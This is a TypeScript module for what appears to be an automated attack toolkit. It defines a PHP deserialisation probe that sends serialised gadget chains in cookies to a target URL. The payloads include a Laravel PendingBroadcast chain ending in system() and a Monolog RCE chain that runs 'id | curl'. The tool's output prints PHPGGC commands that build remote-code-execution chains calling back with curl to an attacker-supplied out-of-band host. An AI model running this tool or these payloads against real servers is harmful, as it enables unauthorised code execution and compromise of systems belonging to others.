// T42 — php_deserial_probe
// PHP deserialisation: phar:// stream wrapper, magic-method gadgets,
// unserialise-via-cookie.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'php_deserial_probe',
  description:
    'PHP deserialisation attack suite. Tests phar:// stream wrapper attacks, magic-method ' +
    'gadget chains (__destruct, __wakeup), and unserialise-via-cookie. Detection: ' +
    'PHP session cookies, X-Powered-By: PHP, .php endpoints, PHPSESSID.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',         type: 'string', required: true,  description: 'Target URL' },
    { name: 'cookie_name', type: 'string', required: false, description: 'Cookie name containing serialised PHP data', default: 'PHPSESSID' },
    { name: 'oob_host',    type: 'string', required: true,  description: 'OOB callback host for RCE confirmation' },
    { name: 'headers',     type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms',  type: 'number', required: false, description: 'Per-request timeout ms', default: 15000 },
  ],
};

// PHP serialised object canary payloads
const PHP_PAYLOADS = [
  // O: prefix detection canary
  { name: 'basic_object',          payload: 'O:8:"stdClass":0:{}',                                       note: 'Canary: basic serialised stdClass' },
  // Magic method probe: __destruct
  { name: 'destruct_gadget',       payload: 'O:29:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"\\0*\\0events";O:15:"Faker\\Generator":1:{s:13:"\\0*\\0formatters";a:1:{s:8:"dispatch";s:6:"system";}}}', note: 'Laravel PendingBroadcast chain → system()' },
  // Simple file disclosure via __toString
  { name: 'tostring_file_read',    payload: `O:8:"SplStack":0:{}`,                                       note: 'SplStack → __toString file read attempt' },
  // PHPGGC-style chain
  { name: 'monolog_chain',         payload: 'O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"\\0*\\0socket";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\\0*\\0handler";r:1;s:13:"\\0*\\0bufferSize";i:-1;s:9:"\\0*\\0buffer";a:1:{i:0;a:2:{i:0;s:10:"id | curl ";i:1;s:8:"critical";}}s:8:"\\0*\\0level";N;s:14:"\\0*\\0initialized";b:1;s:14:"\\0*\\0stopBuffering";b:1;s:10:"\\0*\\0passthru";N;}}', note: 'Monolog RCE chain' },
];

async function detectPhp(url: string, headers: Record<string, string>, timeoutMs: number): Promise<{ is_php: boolean; has_session: boolean; php_version: string }> {
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    const resp = await fetch(url, { headers, signal: controller.signal });
    clearTimeout(timer);
    const poweredBy = resp.headers.get('x-powered-by') || '';
    const setCookie = resp.headers.get('set-cookie') || '';
    const isPhp = poweredBy.toLowerCase().includes('php') || url.includes('.php') || setCookie.includes('PHPSESSID');
    const vMatch = poweredBy.match(/PHP\/([\d.]+)/i);
    return { is_php: isPhp, has_session: setCookie.includes('PHPSESSID'), php_version: vMatch?.[1] || 'unknown' };
  } catch {
    return { is_php: false, has_session: false, php_version: 'unknown' };
  }
}

export const phpDeserialProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const cookieName = String(params.cookie_name || 'PHPSESSID');
    const oobHost = String(params.oob_host || '');
    const timeoutMs = Number(params.timeout_ms || 15000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const detection = await detectPhp(url, headers, timeoutMs);

    const results: Array<{ name: string; status: number; interesting: boolean; note: string; error?: string }> = [];

    for (const payload of PHP_PAYLOADS) {
      const start = Date.now();
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const probeHeaders = { ...headers, 'Cookie': `${cookieName}=${encodeURIComponent(payload.payload)}` };
        const resp = await fetch(url, { headers: probeHeaders, signal: controller.signal });
        clearTimeout(timer);
        const text = await resp.text();
        const interesting = /warning|error|exception|unserializ|__destruct|__wakeup/i.test(text) || resp.status >= 500;
        results.push({ name: payload.name, status: resp.status, interesting, note: payload.note });
      } catch (err) {
        results.push({ name: payload.name, status: 0, interesting: false, note: payload.note, error: String(err) });
      }
    }

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `php_deserial_probe — ${url.substring(0, 80)}`,
      `PHP detected: ${detection.is_php}  Version: ${detection.php_version}  Has PHPSESSID: ${detection.has_session}`,
      `Interesting responses: ${interesting.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ INTERESTING' : (r.error ? '✗ ERR        ' : '  ·          ');
      lines.push(`  ${flag}  [${r.name.padEnd(22)}]  status=${r.status}  ${r.note}`);
    }
    lines.push('');
    lines.push('GADGET CHAIN GENERATION: Use PHPGGC tool for targeted chains:');
    lines.push(`  phpggc Laravel/RCE6 system "curl ${oobHost}/laravel-rce" | base64`);
    lines.push(`  phpggc Symfony/RCE4 system "curl ${oobHost}/symfony-rce" | base64`);
    lines.push(`  phpggc Yii1/RCE1 system "curl ${oobHost}/yii-rce" | base64`);

    return {
      output: lines.join('\n'),
      parsed: { detection, probe_results: results, interesting_count: interesting.length },
    };
  },
};
